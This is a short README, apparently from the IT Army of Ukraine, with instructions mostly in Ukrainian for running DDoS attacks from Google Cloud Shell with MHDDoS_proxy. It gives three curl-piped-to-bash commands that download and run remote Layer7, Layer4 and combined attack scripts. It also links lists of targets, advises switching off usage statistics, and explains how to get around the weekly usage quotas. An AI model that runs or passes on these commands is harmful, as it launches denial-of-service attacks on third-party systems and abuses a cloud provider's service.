## DDoS whith Google Cloud Shell (MHDDoS_proxy)
#### Making script for durable cloudshell session
#
# ТЕСТ
### Використовуємо https://shell.cloud.google.com/?fromcloudshell=true&show=terminal

## Команди для запуску атаки
#### по Layer7:
```
curl -l https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/Start_L7m.sh | bash
```
#### по Layer4:
```
curl -l https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/Test_L4.sh | bash
```
#### Подвійна атака (Layer7+Layer4) розділений термінал (tmux):
```
curl -l https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/Start_dualShell.sh | bash
```
У GCloudShell https://shell.cloud.google.com/?fromcloudshell=true&show=terminal в налаштуваннях вимикаємо статистику використання.
Дозволяється запускати до 4 терміналів на 1 акаунт але доцільніше використовувати 1-2 термінали на акаунт.
Також враховуйте, що встановлені тижневі квоти на використання, 1 акаунт - 50 годин у звичайному режимі та 50 годин у ефемерному режимі (до закінчення квоти у звичайному режимі - вмикаємо Ephemeral Mode (ставимо - "Завжди") та отримуємо ще 50 годин використання на поточний тиждень)
#
Перезапуск скрипту кожні 15 хв, метод атаки додається зі списку цілей, параметр -t за замовчуванням 1000

#
Списки з цілями

https://raw.githubusercontent.com/Operation-Stop-russia/targets_lists/main/L7m.lst

https://raw.githubusercontent.com/Operation-Stop-russia/targets_lists/main/L4


#
#
IT ARMY of Ukraine
